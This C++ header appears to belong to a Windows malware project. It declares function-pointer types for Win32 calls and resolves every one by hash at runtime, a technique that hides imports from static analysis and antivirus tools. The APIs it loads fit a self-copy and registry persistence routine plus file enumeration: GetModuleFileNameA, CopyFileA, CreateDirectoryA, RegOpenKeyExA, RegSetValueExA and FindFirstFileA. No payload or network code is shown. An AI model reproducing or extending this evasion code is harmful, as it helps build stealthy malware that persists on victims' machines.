#pragma once
#include "HashModule.h"

using customGetEnvironmentVariableA = LSTATUS(NTAPI*)(
    LPCSTR lpName,
    LPSTR lpBuffer,
    DWORD nSize
    );

using customCreateDirectoryA = BOOL(NTAPI*)(
    LPCSTR lpPathName,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes
    );

using customGetModuleFileNameA = DWORD(NTAPI*)(
    HMODULE hModule,
    LPSTR lpFilename,
    DWORD nSize
    );

using customRegOpenKeyExA = LSTATUS(NTAPI*)(
    HKEY hKey,
    LPCSTR lpSubKey,
    DWORD ulOptions,
    REGSAM samDesired,
    PHKEY phkResult
    );

using customRegSetValueExA = LSTATUS(NTAPI*)(
    HKEY hKey,
    LPCSTR lpValueName,
    DWORD Reserved,
    DWORD dwType,
    const BYTE* lpData,
    DWORD      cbData
    );

using customRegCloseKey = LSTATUS(NTAPI*)(
    HKEY hKey
    );

using customCopyFileA = BOOL(NTAPI*)(
    LPCSTR lpExistingFileName,
    LPCSTR lpNewFileName,
    BOOL bFailIfExists
    );

using customGetModuleHandleA = HMODULE(NTAPI*)(
    LPCSTR lpModuleName
);

using customFindFirstFileA = HANDLE(NTAPI*)(
    LPCSTR lpFileName,
    LPWIN32_FIND_DATAA lpFindFileData
);

using customFindNextFileA = BOOL(NTAPI*)(
    HANDLE hFindFile,
    LPWIN32_FIND_DATAA lpFindFileData
);

using customFindClose = BOOL(NTAPI*)(
    HANDLE hFindFile
);

customGetEnvironmentVariableA GetEnvironmentVariableA_c = (customGetEnvironmentVariableA)getFunctionAddressByHash((char*)"Kernel32", getHashFromString((char*)"GetEnvironmentVariableA"));

customRegOpenKeyExA RegOpenKeyExA_c = (customRegOpenKeyExA)getFunctionAddressByHash((char*)"Advapi32", getHashFromString((char*)"RegOpenKeyExA"));

customRegSetValueExA RegSetValueExA_c = (customRegSetValueExA)getFunctionAddressByHash((char*)"Advapi32", getHashFromString((char*)"RegSetValueExA"));

customRegCloseKey RegCloseKey_c = (customRegCloseKey)getFunctionAddressByHash((char*)"Advapi32", getHashFromString((char*)"RegCloseKey"));

customGetModuleFileNameA GetModuleFileNameA_c = (customGetModuleFileNameA)getFunctionAddressByHash((char*)"Kernel32", getHashFromString((char*)"GetModuleFileNameA"));

customCreateDirectoryA CreateDirectoryA_c = (customCreateDirectoryA)getFunctionAddressByHash((char*)"Kernel32", getHashFromString((char*)"CreateDirectoryA"));

customCopyFileA CopyFileA_c = (customCopyFileA)getFunctionAddressByHash((char*)"Kernel32", getHashFromString((char*)"CopyFileA"));

customGetModuleHandleA GetModuleHandleA_c = (customGetModuleHandleA)getFunctionAddressByHash((char*)"Kernel32", getHashFromString((char*)"GetModuleHandleA"));

customFindFirstFileA FindFirstFileA_c = (customFindFirstFileA)getFunctionAddressByHash((char*)"Kernel32", getHashFromString((char*)"FindFirstFileA"));

customFindNextFileA FindNextFileA_c = (customFindNextFileA)getFunctionAddressByHash((char*)"Kernel32", getHashFromString((char*)"FindNextFileA"));

customFindClose FindClose_c = (customFindClose)getFunctionAddressByHash((char*)"Kernel32", getHashFromString((char*)"FindClose"));